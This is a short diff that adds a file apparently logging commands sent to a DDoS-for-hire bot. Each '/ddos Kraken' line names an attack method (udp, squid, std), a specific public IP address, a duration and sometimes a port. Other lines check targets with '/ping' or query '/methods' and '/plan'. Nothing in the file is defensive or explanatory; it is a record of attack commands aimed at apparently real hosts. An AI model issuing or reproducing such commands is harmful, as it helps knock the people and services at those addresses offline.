@@ -1,0 +1,15 @@
+/tr4p
+/ddos Kraken squid 74.77.191.246 20
+/ddos Kraken squid 76.184.51.132 30
+/ddos kraken udp 76.184.51.132 30
+/ping 76.184.51.132
+/ping 76.184.51.132
+/sms
+/methods
+/ddos Kraken udp 74.102.234.13 600 80
+/ddos Kraken udp 74.102.234.13 120 80
+/ddos Kraken udp 74.102.234.13 120 80
+/methods
+/ddos kraken std 98.198.118.8 120 59229
+/tr4p
+/plan
